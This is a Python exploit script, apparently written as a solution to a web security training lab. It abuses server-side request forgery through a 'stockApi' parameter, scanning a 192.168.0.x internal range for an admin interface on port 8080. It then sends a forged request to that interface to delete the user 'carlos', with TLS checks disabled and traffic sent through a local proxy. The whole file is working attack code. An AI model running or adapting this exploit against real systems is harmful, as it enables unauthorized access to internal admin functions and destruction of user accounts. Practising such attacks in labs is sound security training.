import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def check_admin_hostname(url):
    # Finding the local ip address for admin interface
    print('[+] Checking Admin Hostname:')
    for i in range(1, 256):
        admin_hostname = f"http://192.168.0.{i}:8080/admin"
        params = {'stockApi': admin_hostname}
        sys.stdout.write(f"\rhttp://192.168.0.{i}:8080/admin")
        sys.stdout.flush()
        check_stock_path = '/product/stock'

        res = requests.post(url+check_stock_path, data=params,
                            verify=False, proxies=proxies)
        if res.status_code == 200:
            return admin_hostname
    return False


def delete_user(url, admin_hostname):
    # Delete the user 'carlos'
    delete_user_url_ssrf_payload = f'{admin_hostname}/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    res = requests.post(url+check_stock_path, data=params,
                        verify=False, proxies=proxies)

    # Check if user was deleted
    params2 = {'stockApi': admin_hostname}

    res = requests.post(url+check_stock_path, data=params2,
                        verify=False, proxies=proxies)

    if 'carlos' not in res.text:
        print("[+] Sucessfully deleted user 'carlos'!")
    else:
        print("[-] Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} http://example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Finding admin hostname...")
    admin_hostname = check_admin_hostname(url)
    if admin_hostname:
        print(f"\n[+] Admin hostname is: {admin_hostname}")
        print("[+] Deleting user 'carlos'...")
        delete_user(url, admin_hostname)
    else:
        print("[-] Could not find admin hostname...")
    


if __name__ == '__main__':
    main()
